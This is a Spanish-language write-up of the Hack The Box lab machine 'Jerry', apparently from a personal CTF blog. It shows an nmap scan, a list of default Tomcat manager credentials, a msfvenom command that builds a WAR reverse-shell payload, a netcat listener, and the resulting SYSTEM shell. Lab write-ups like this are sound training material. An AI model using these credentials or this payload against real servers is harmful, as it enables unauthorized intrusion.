@@ -1,0 +1,150 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>HTB-Jerry — themaxterone</title>
+<meta name="description" content="WriteUp de la máquina HTB Jerry – Type: Easy">
+<meta property="og:title" content="HTB-Jerry — themaxterone">
+<meta property="og:description" content="WriteUp de la máquina HTB Jerry – Type: Easy">
+<meta property="og:type" content="website">
+<meta name="twitter:card" content="summary">
+<meta name="theme-color" content="#07090c">
+<link rel="icon" href="../assets/images/maxteravatar.png">
+<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600&family=JetBrains+Mono:wght@400;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../assets/css/site.css">
+
+</head>
+<body class="post-page">
+<div class="progress" aria-hidden="true"><div id="progress-bar"></div></div>
+<header class="site-header">
+  <div class="wrap nav">
+    <a class="brand" href="../" aria-label="themaxterone home"><img src="../assets/images/maxteravatar.png" alt="" width="32" height="32"><span><b>~/</b>themaxterone</span></a>
+    <button class="nav-toggle" type="button" aria-label="Toggle menu" aria-expanded="false"><span></span><span></span></button>
+    <nav class="nav-links" id="nav-links">
+      <a href="../">home</a>
+      <a href="../writeups/" class="active">write-ups</a>
+      <a href="../writeups/?cat=Scripts">tools</a>
+      <a href="../about/">about</a>
+      <a class="nav-cta" href="https://github.com/themaxterone" target="_blank" rel="noopener noreferrer">github ↗</a>
+    </nav>
+  </div>
+</header>
+<main>
+<header class="post-head">
+  <div class="wrap narrow">
+    <nav class="crumbs" aria-label="Breadcrumb"><a href="../">home</a> / <a href="../writeups/">write-ups</a> / <span>HTB-Jerry</span></nav>
+    <p class="eyebrow"><span class="dot"></span> machine write-up</p>
+    <h1>HTB-Jerry <img class="title-icon" src="../assets/images/hackthebox.webp" alt="" width="36" height="36"></h1>
+    <div class="card-meta"><time datetime="2022-04-05">Apr 05, 2022</time><span>·</span><span>2 min read</span></div>
+    <div class="chips"><a class="chip" href="../writeups/?tag=HTB">HTB</a><a class="chip" href="../writeups/?tag=Easy">Easy</a></div>
+  </div>
+</header>
+<div class="wrap post-layout">
+  <aside class="toc" aria-label="Table of contents"><p class="toc-title">// contents</p><ol><li><a href="#reconocimiento">Reconocimiento</a></li><li><a href="#explotación">Explotación</a></li></ol></aside>
+  <article class="prose" lang="es">
+<p><img src="../assets/images/writeups/jerry/jerry.png" alt="" loading="lazy"></p>
+<p><a href="https://app.hackthebox.com/machines/Jerry" target="_blank" rel="noopener noreferrer">Maquina</a> </p>
+<h2 id="reconocimiento"><a class="anchor" href="#reconocimiento" aria-hidden="true">#</a>Reconocimiento</h2>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">bash</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code><span class="hljs-built_in">sudo</span> nmap -sCV --min-rate 5000 -Pn 10.10.10.95 </code></pre></div>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">bash</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.95
+Host is up (0.041s latency).
+Not shown: 999 filtered tcp ports (no-response)
+PORT     STATE SERVICE VERSION
+8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
+|_http-title: Apache Tomcat/7.0.88
+|_http-favicon: Apache Tomcat
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-server-header: Apache-Coyote/1.1</code></pre></div>
+<p>Al mirar el resultado del nmap, vemos que el puerto <strong>8080</strong> tiene un http abierto con <strong>Apache Tomcat</strong> al cual accederemos a el.</p>
+<p><img src="../assets/images/writeups/jerry/panel1.png" alt="" loading="lazy"></p>
+<p>Nos encontramos un panel de tomcat dónde en la parte de la derecha tenemos un link a la <strong>managment app</strong> la cual podemos clickar y ver que pasa.</p>
+<p><img src="../assets/images/writeups/jerry/panel2.png" alt="" loading="lazy"></p>
+<p>Nos encontramos un panel de login en el cual podemos intentar iniciar sesion con las credenciales por defecto de este software.</p>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">output</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code>Username:assword
+
+admin:password
+admin:
+admin:Password1
+admin:password1
+admin:admin
+admin:tomcat
+both:tomcat
+manager:manager
+role1:role1
+role1:tomcat
+role:changethis
+root:Password1
+root:changethis
+root:password
+root:password1
+root:r00t
+root:root
+root:toor
+tomcat:tomcat
+tomcat:s3cret
+tomcat:password1
+tomcat:password
+tomcat:
+tomcat:admin
+tomcat:changethis</code></pre></div>
+<p>Vemos que las credenciales correctas son <strong>tomcat:s3cret</strong>.</p>
+<p><img src="../assets/images/writeups/jerry/panel3.png" alt="" loading="lazy"></p>
+<p>En el caso de que salirte del panel de credenciales nos sale una página de error con las credenciales correctas.</p>
+<p><img src="../assets/images/writeups/jerry/panel4.png" alt="" loading="lazy"></p>
+<p>Ahora, tenemos un control panel donde podemos subir archivos <strong>.war</strong></p>
+<h2 id="explotación"><a class="anchor" href="#explotación" aria-hidden="true">#</a>Explotación</h2>
+<p>Procedemos a la creacion de un archivo <strong>.war</strong> con <strong>msfvenom</strong> para devolvernos una reverseshell a nuestra máquina desde la víctima para poder controlarla.</p>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">bash</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.6 LPORT=443 -f war -o reverse.war</code></pre></div>
+<p>Lo subimos a la web y le damos a deploy.</p>
+<p><img src="../assets/images/writeups/jerry/panel5.png" alt="" loading="lazy"></p>
+<p>Nos ponemos en escucha con netcat y ejecutamos el war desde la <strong>url</strong></p>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">bash</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code>nc -lvp 443 <span class="hljs-comment">#netcat</span>
+
+http://10.10.10.95:8080/reverse <span class="hljs-comment">#url</span></code></pre></div>
+<p>Obtenemos la reverseshell:</p>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">output</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code>connect to [10.10.14.6] from (UNKNOWN) [10.10.10.95] 49193
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\apache-tomcat-7.0.88&gt;</code></pre></div>
+<p>Comprobamos que usuario somos:</p>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">powershell</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code>C:\apache<span class="hljs-literal">-tomcat-7</span>.<span class="hljs-number">0.88</span>&gt;whoami
+        whoami
+nt authority\system
+
+C:\apache<span class="hljs-literal">-tomcat-7</span>.<span class="hljs-number">0.88</span>&gt;</code></pre></div>
+<p>Flag de los <strong>Usuarios</strong>:</p>
+<div class="code-block"><div class="code-head"><span class="code-dots"><i></i><i></i><i></i></span><span class="code-lang">powershell</span><button class="copy-btn" type="button" aria-label="Copy code">copy</button></div><pre><code>C:\Users\Administrator\Desktop\flags&gt;<span class="hljs-built_in">dir</span>
+<span class="hljs-built_in">dir</span>
+ Volume <span class="hljs-keyword">in</span> drive C has no label.
+ Volume Serial Number is <span class="hljs-number">0834</span><span class="hljs-literal">-6C04</span>
+
+ Directory of C:\Users\Administrator\Desktop\flags
+
+<span class="hljs-number">06</span>/<span class="hljs-number">19</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">07</span>:<span class="hljs-number">09</span> AM    &lt;<span class="hljs-built_in">DIR</span>&gt;          .
+<span class="hljs-number">06</span>/<span class="hljs-number">19</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">07</span>:<span class="hljs-number">09</span> AM    &lt;<span class="hljs-built_in">DIR</span>&gt;          ..
+<span class="hljs-number">06</span>/<span class="hljs-number">19</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">07</span>:<span class="hljs-number">11</span> AM                <span class="hljs-number">88</span> <span class="hljs-number">2</span> <span class="hljs-keyword">for</span> the price of <span class="hljs-number">1</span>.txt
+               <span class="hljs-number">1</span> File(s)             <span class="hljs-number">88</span> bytes
+               <span class="hljs-number">2</span> <span class="hljs-built_in">Dir</span>(s)   <span class="hljs-number">2</span>,<span class="hljs-number">419</span>,<span class="hljs-number">703</span>,<span class="hljs-number">808</span> bytes free
+
+C:\Users\Administrator\Desktop\flags&gt;</code></pre></div>
+
+
+  </article>
+</div>
+<nav class="wrap narrow pager" aria-label="More posts">
+  <a href="../HTB-Lame/"><span>← older</span>HTB-Lame</a>
+  <a class="right" href="../HTB-Heist/"><span>newer →</span>HTB-Heist</a>
+</nav>
+</main>
+<footer class="site-footer">
+  <div class="wrap footer-inner">
+    <p><span class="prompt">$</span> echo "stay curious, stay legal"</p>
+    <p class="muted">© 2026 themaxterone · Hack The Box write-ups &amp; tools</p>
+    <p><a href="https://github.com/themaxterone" target="_blank" rel="noopener noreferrer">github.com/themaxterone</a></p>
+  </div>
+</footer>
+<script src="../assets/js/site.js" defer></script>
+</body>
+</html>
